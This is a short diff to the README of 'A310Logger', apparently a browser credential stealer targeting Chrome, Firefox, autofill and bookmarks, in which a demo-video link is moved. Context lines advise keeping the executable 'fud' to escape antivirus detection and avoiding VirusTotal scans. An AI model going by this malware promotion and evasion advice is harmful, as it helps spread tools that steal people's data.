@@ -19,6 +19,9 @@ Chrome 80 > is supported and mozilla firefox
  * Autofil
  * Bookmarks
  
+# Demo Video Youtube
+https://www.youtube.com/watch?v=n4-3zhOxulc
+
 # :scroll: Installation :
 
 * Open visual studio and click build or use the exe file that i have upload here 
@@ -72,9 +75,6 @@ To escape antivirus detection and always stay fud , the executable A310Logger.ex
 # Please don't scan with virustotal.com ,you can build at yourself the project,
       you scan only with your antivirus 
       
-# DEMO VIDEOS YOUTUBE
-
-https://youtu.be/n4-3zhOxulc
  
  # Contact 
  
